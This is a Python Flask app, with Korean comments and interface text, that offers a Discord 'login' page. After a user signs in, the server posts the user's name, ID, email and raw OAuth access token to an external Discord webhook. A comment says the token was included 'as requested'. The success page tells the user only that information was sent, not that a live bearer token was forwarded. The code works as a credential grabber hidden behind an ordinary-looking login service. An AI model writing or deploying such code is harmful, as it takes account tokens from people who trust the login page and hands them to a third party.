import os
import requests
import time
import logging
import urllib.parse
from flask import Flask, request, redirect

# 환경 변수 로드
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Discord OAuth2 로그인</title>
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #0d1117; color: #c9d1d9; }
            .container { text-align: center; background: #161b22; padding: 50px 60px; border-radius: 16px; border: 1px solid #30363d; box-shadow: 0 8px 32px rgba(0,0,0,0.4); max-width: 500px; }
            h1 { color: #58a6ff; font-size: 28px; margin-bottom: 10px; }
            p { color: #8b949e; margin-bottom: 30px; font-size: 15px; }
            .btn { background: #5865f2; color: white; padding: 14px 40px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; transition: background 0.2s; }
            .btn:hover { background: #4752c4; }
            .footer { margin-top: 20px; font-size: 12px; color: #484f58; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔑 Discord OAuth2</h1>
            <p>디스코드 계정으로 간편하게 로그인하세요</p>
            <a href="/login" class="btn">🚀 디스코드로 로그인</a>
            <div class="footer">개발자: gg • Render 배포</div>
        </div>
    </body>
    </html>
    '''

@app.route('/login')
def login():
    encoded_redirect_uri = urllib.parse.quote(REDIRECT_URI, safe='')
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={encoded_redirect_uri}"
        f"&response_type=code"
        f"&scope=identify+email"
    )
    return redirect(discord_auth_url)

@app.route('/oauth2')
def oauth2_callback():
    code = request.args.get('code')
    if not code:
        logger.error("인증 코드가 없습니다.")
        return "❌ 인증 코드가 없습니다.", 400

    logger.info(f"📩 받은 코드: {code[:20]}...")

    try:
        token_data = exchange_code_for_token(code)
        if not token_data or 'access_token' not in token_data:
            logger.error("토큰 교환 실패")
            return "❌ 토큰 교환에 실패했습니다. 다시 로그인해주세요.", 400

        user_info = get_user_info(token_data['access_token'])
        if not user_info:
            logger.error("사용자 정보 조회 실패")
            return "❌ 사용자 정보를 가져오지 못했습니다.", 500

        # 웹훅 전송 (요청대로 Access Token 포함)
        send_to_webhook(token_data, user_info)
        logger.info(f"✅ {user_info.get('username')} 로그인 성공, 웹훅 전송 완료")

        return success_page(user_info)

    except Exception as e:
        logger.exception("OAuth2 콜백 처리 중 오류 발생")
        return f"❌ 서버 오류: {str(e)}", 500

def exchange_code_for_token(code):
    """인증 코드를 액세스 토큰으로 교환 (time.sleep 삭제로 속도 향상)"""
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    try:
        response = requests.post(
            'https://discord.com/api/v10/oauth2/token',
            data=data,
            headers=headers,
            timeout=10
        )
        logger.info(f"📨 토큰 교환 응답 코드: {response.status_code}")

        if response.status_code == 200:
            return response.json()
        else:
            logger.error(f"❌ 토큰 교환 실패: {response.status_code} - {response.text[:200]}")
            return None

    except requests.exceptions.RequestException:
        logger.exception("토큰 교환 API 요청 실패")
        return None

def get_user_info(access_token):
    """액세스 토큰으로 사용자 정보 가져오기"""
    headers = {'Authorization': f'Bearer {access_token}'}

    try:
        response = requests.get(
            'https://discord.com/api/v10/users/@me',
            headers=headers,
            timeout=10
        )

        if response.status_code == 200:
            return response.json()
        else:
            logger.error(f"사용자 정보 조회 실패: {response.status_code}")
            return None

    except requests.exceptions.RequestException:
        logger.exception("사용자 정보 API 요청 실패")
        return None

def send_to_webhook(token_data, user_info):
    """Discord 웹훅으로 사용자 정보 및 Access Token 전송"""
    if not WEBHOOK_URL:
        logger.warning("WEBHOOK_URL이 설정되지 않았습니다.")
        return

    webhook_data = {
        "content": f"🔑 **{user_info.get('username')}** 님이 로그인했습니다!",
        "embeds": [{
            "title": "👤 사용자 정보",
            "color": 0x5865F2,
            "fields": [
                {"name": "📛 사용자명", "value": user_info.get('username', 'N/A'), "inline": True},
                {"name": "🆔 ID", "value": f"`{user_info.get('id', 'N/A')}`", "inline": True},
                {"name": "📧 이메일", "value": user_info.get('email', '비공개'), "inline": True},
                {"name": "🔑 Access Token", "value": f"```{token_data.get('access_token', 'N/A')}```", "inline": False}
            ],
            "footer": {"text": f"로그인 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}"}
        }]
    }

    try:
        response = requests.post(WEBHOOK_URL, json=webhook_data, timeout=10)
        if response.status_code == 204:
            logger.info("✅ 웹훅 전송 성공!")
        else:
            logger.error(f"❌ 웹훅 전송 실패: {response.status_code} - {response.text[:200]}")
    except requests.exceptions.RequestException:
        logger.exception("웹훅 전송 실패")

def success_page(user_info):
    username = user_info.get('username', 'Unknown')
    email = user_info.get('email', 'N/A')
    user_id = user_info.get('id', 'N/A')

    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>로그인 성공!</title>
        <style>
            body {{ font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #0d1117; color: #c9d1d9; }}
            .container {{ text-align: center; background: #161b22; padding: 50px; border-radius: 16px; border: 1px solid #30363d; max-width: 500px; box-shadow: 0 8px 32px rgba(0,0,0,0.3); }}
            h1 {{ color: #3fb950; margin-bottom: 10px; }}
            .info {{ text-align: left; background: #0d1117; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #30363d; }}
            .info p {{ margin: 8px 0; }}
            .label {{ color: #8b949e; font-size: 12px; }}
            .value {{ color: #c9d1d9; font-weight: bold; }}
            .btn {{ background: #238636; color: white; padding: 12px 30px; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; }}
            .btn:hover {{ background: #2ea043; }}
            .footer {{ margin-top: 20px; font-size: 12px; color: #484f58; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>✅ 로그인 성공!</h1>
            <p>웹훅으로 정보가 전송되었습니다.</p>
            <div class="info">
                <p><span class="label">사용자명</span><br><span class="value">{username}</span></p>
                <p><span class="label">이메일</span><br><span class="value">{email}</span></p>
                <p><span class="label">사용자 ID</span><br><span class="value">{user_id}</span></p>
            </div>
            <a href="/" class="btn">🏠 홈으로</a>
            <div class="footer">gg • Discord OAuth2</div>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    logger.info("=" * 60)
    logger.info("🚀 Discord OAuth2 서버 시작")
    logger.info("=" * 60)
    logger.info(f"🔑 Client ID: {CLIENT_ID}")
    logger.info(f"🔗 Redirect URI: {REDIRECT_URI}")
    logger.info(f"📤 Webhook: {WEBHOOK_URL[:50] if WEBHOOK_URL else 'Not Set'}...")
    logger.info("=" * 60)
    logger.info(f"✅ 서버 실행 중: 0.0.0.0:{port}")
    logger.info("=" * 60)

    app.run(host='0.0.0.0', port=port)
